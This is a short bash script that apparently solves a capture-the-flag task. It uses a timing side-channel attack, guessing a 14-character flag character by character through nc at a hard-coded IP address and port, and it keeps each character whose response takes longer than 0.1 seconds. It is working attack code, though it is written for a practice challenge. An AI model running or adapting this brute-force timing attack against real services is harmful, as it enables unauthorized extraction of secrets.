#!/bin/bash

# Define the known part of the flag (initially empty)
known_flag=""

# Define the target string length
target_length=14

# Iterate over the length of the flag
for i in $(seq 1 $target_length); do
  for c in {a..z} {A..Z} {0..9}; do
    # Construct the test string
    test_string="${known_flag}${c}"
    
    # Measure the time taken to get a response
    start_time=$(date +%s.%N)
    response=$(echo "$test_string" | nc 103.28.91.24 10020)
    end_time=$(date +%s.%N)
    
    # Calculate the duration
    duration=$(echo "$end_time - $start_time" | bc)
    
    # Print the character and duration
    echo "Testing '$test_string' - Time: $duration"
    
    # Check the response time to determine if the character is correct
    # You may need to adjust the threshold based on the response times you observe
    if (( $(echo "$duration > 0.1" |bc -l) )); then
      known_flag="${test_string}"
      echo "Found: $known_flag"
      break
    fi
  done
done

echo "Flag found: $known_flag"

